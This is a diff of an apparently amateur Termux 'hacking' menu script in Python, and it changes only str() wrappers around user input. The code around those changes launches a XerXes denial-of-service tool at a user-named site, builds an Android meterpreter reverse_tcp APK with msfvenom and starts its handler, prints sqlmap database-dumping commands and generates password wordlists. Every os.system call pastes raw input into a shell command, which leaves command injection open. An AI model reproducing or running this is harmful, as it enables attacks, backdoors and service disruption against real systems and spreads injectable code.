@@ -295,7 +295,7 @@ def all_termux_libs_down() :
 	print("Download Complated")
 	print("Open?")
 	userrecon_ans = input("[y/n] ")
-	if userrecon_ans == "y" or userrecon_ans == "Y" :
+	if str(userrecon_ans) == "y" or str(userrecon_ans) == "Y" :
 		os.system("chmod +x /data/data/com.termux/files/home/userrecon/userrecon.sh")
 		os.system("bash /data/data/com.termux/files/home/userrecon/userrecon.sh")
 	else :
@@ -347,7 +347,7 @@ def morze_alph() :
 	print("Please use big characters")
 	print("Example : .... . ._.. ._.. ___ --> HELLO")
 	code = input("Morze code --> ")
-	liste= list(code)
+	liste= list(str(code))
 	liste1 = str(liste)
 	liste2 = liste1.replace("[","")
 	liste3 = liste2.replace("]","")
@@ -465,9 +465,9 @@ def startscreen_menu():
 [3]Exit
 		""")
 		lib_ans = input("hAcK --> ")
-		if lib_ans == "1" :
+		if str(lib_ans) == "1" :
 			show_libs()
-		elif lib_ans == "2" :
+		elif str(lib_ans) == "2" :
 			down_libs()
 		else :
 			print(nothing)
@@ -483,7 +483,7 @@ def startscreen_menu():
 [4] Write your name big and colorful
 		""")
 		simple_funcs = input("hAcK --> ")
-		s_funs = simple_funcs
+		s_funs = str(simple_funcs)
 		if s_funs == "1" :
 			print("Password with symbol --> " + password)
 			print("Password without symbol --> " + passwordS)
@@ -494,10 +494,10 @@ def startscreen_menu():
 			morze_alph()
 		elif s_funs == "4" :
 			rainBow_word_ans = input("Write your word :")
-			os.system("toilet -f mono12 -F gay " + rainBow_word_ans)
+			os.system("toilet -f mono12 -F gay " + str(rainBow_word_ans))
 	elif str(terminal) == "4" :
 		ter2 = input("Enter site's link --> ")
-		os.system("whois " + ter2)
+		os.system("whois " + str(ter2))
 	elif str(terminal) == "1" :
 		print("Closing...")
 		os.system("clear")
@@ -511,7 +511,7 @@ def startscreen_menu():
 	elif str(terminal) == "6" :
   	  print("Enter site's link")
   	  site_ip = input("hAcK --> ")
-  	  os.system("ping " + site_ip)
+  	  os.system("ping " + str(site_ip))
 	elif str(terminal) == "7" :
 		os.system("clear")
 		os.system("git clone https://github.com/CyberXCodder/XerXes.git")
@@ -522,7 +522,7 @@ def startscreen_menu():
 		print("You must first agree with the rules. You are responsible for obtaining the IP address and everything else")
 		print("write site's name")
 		site_dos = input("hAcK --> ")
-		os.system("./xerxes " + site_dos + " 80")
+		os.system("./xerxes " + str(site_dos) + " 80")
 	elif str(terminal) == "8" :
 		os.system("clear")
 		os.system("wget " + metasploit)
@@ -545,14 +545,14 @@ def startscreen_menu():
 		your_wifi_IP = input("hAcK --> ")
 		print("ENTER YOUR APK'S NAME")
 		your_apks_name = input("hAcK --> ")
-		os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + your_wifi_IP + " lport=4444 -o /sdcard/" + your_apks_name + ".apk")
+		os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + str(your_wifi_IP) + " lport=4444 -o /sdcard/" + str(your_apks_name) + ".apk")
 		print("SECOND PART STARTING...")
 		presS = input("Press Enter")
 		os.system("cd metasploit-framework")
 		os.system("msfconsole")
 		os.system("use exploit/multi/handler")
 		os.system("set payload android/meterpreter/reverse_tcp")
-		os.system("set lhost " + your_wifi_IP)
+		os.system("set lhost " + str(your_wifi_IP))
 		os.system("set lport 4444")
 		os.system("exploit")
 	elif str(terminal) == "11" :
@@ -562,7 +562,7 @@ def startscreen_menu():
 	elif str(terminal) == "S2" :
 		os.system("clear")
 		passW = input("Enter password '")
-		if passW != hjdUv and passW != your_tool_id :
+		if str(passW) != hjdUv and str(passW) != str(your_tool_id) :
 			print("WRONG password")
 		else :
 			print("""
@@ -618,7 +618,7 @@ in packages :
 		print("Complated")
 		print("Open?")
 		userrecon_ans = input("[y/n] ")
-		if userrecon_ans == "y" or userrecon_ans == "Y" :
+		if str(userrecon_ans) == "y" or str(userrecon_ans) == "Y" :
 			os.system("cd /data/data/com.termux/files/home/userrecon")
 			os.system("chmod +x /data/data/com.termux/files/home/userrecon/userrecon.sh")
 			os.system("bash /data/data/com.termux/files/home/userrecon/userrecon.sh")
@@ -638,7 +638,7 @@ in packages :
 		os.system("clear")
 		print("Start?")
 		lazymux_ans = input("[y/n] ")
-		if lazymux_ans == "y" or lazymux_ans == "Y" :
+		if str(lazymux_ans) == "y" or str(lazymux_ans) == "Y" :
 			os.system("python3 /data/data/com.termux/files/home/Lazymux/lazymux.py")
 		else :
 			print("Ok.")
@@ -655,16 +655,16 @@ in packages :
 [2] Scan site's security
 		""")
 		nmap_cevab_ans = input("hAcK --> ")
-		if nmap_cevab_ans == "1" :
+		if str(nmap_cevab_ans) == "1" :
 			os.system("clear")
 			print("Type site's link or IP")
 			nmap_site_link = input("hAcK -->")
-			os.system("nmap " + nmap_site_link)
-		elif nmap_cevab_ans == "2" :
+			os.system("nmap " + str(nmap_site_link))
+		elif str(nmap_cevab_ans) == "2" :
 			os.system("clear")
 			print("Enter site's IP")
 			nmap_site_ip = input("hAcK --> ")
-			os.system("nmap -sV " + nmap_site_ip)
+			os.system("nmap -sV " + str(nmap_site_ip))
 	elif str(terminal) == "ID" :
 		are_logo()
 	elif str(terminal) == "25" :
@@ -683,7 +683,7 @@ in packages :
 	elif str(terminal) == "27" :
 		print("Do you have SQLMAP?")
 		sqlmap_ans = input("[y/n]")
-		if sqlmap_ans == "y" or sqlmap_ans == "Y" :
+		if str(sqlmap_ans) == "y" or str(sqlmap_ans) == "Y" :
 			print("""
 --> python2 sqlmap.py -u {link} --dbs
                                                        -D {dbs_name} --tables
@@ -699,15 +699,15 @@ in packages :
 		os.system("pip install wordlist")
 		print("Do you have 3,0QB free space?")
 		wordlist_ans = input("[y/n]")
-		if wordlist_ans == "y" or wordlist_ans == "Y" :
+		if str(wordlist_ans) == "y" or str(wordlist_ans) == "Y" :
 			print("Enter wordlist's name : ")
 			wordlistname = input("hAcK --> ")
 			os.system("clear")
 			print("Please wait...")
 			os.system("cd /sdcard")
 			print("Download finished after an hour")
-			print("Downloading " + wordlistname + ".txt")
-			os.system("wordlist -m 7 -M 15 -o /sdcard/" + wordlistname + ".txt 0987654321qwertyuopasdfghjklizxcvbnmQWERTYUOPASDFGHJKLIZXCVBNM ")
+			print("Downloading " + str(wordlistname) + ".txt")
+			os.system("wordlist -m 7 -M 15 -o /sdcard/" + str(wordlistname) + ".txt 0987654321qwertyuopasdfghjklizxcvbnmQWERTYUOPASDFGHJKLIZXCVBNM ")
 		else :
 			print("Download cancelled.")
 	elif str(terminal) == "29" :
